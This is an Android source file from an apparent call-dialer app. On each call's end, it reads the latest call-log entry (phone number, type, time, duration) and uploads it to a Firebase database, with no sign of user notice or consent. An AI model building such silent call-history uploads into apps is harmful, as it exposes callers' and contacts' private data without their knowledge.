package com.mehboob.simplecalldialer;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class CallReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // Call state changes
        if (Objects.equals(intent.getAction(), "android.intent.action.PHONE_STATE")) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                // Call ended → Upload recent log (last 1 record)
                uploadLastCallLog(context);
            }
        }
    }

    private void uploadLastCallLog(Context context) {
        Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 1"
        );

        if (cursor != null && cursor.moveToFirst()) {
            @SuppressLint("Range") String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            @SuppressLint("Range")    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
            @SuppressLint("Range")   long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
            @SuppressLint("Range") int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));

            Map<String, Object> callLog = new HashMap<>();
            callLog.put("number", number);
            callLog.put("type", type);
            callLog.put("timestamp", date);
            callLog.put("duration", duration);

            FirebaseDatabase.getInstance().getReference("call_logs").push().setValue(callLog);
        }

        if (cursor != null) cursor.close();
    }
}

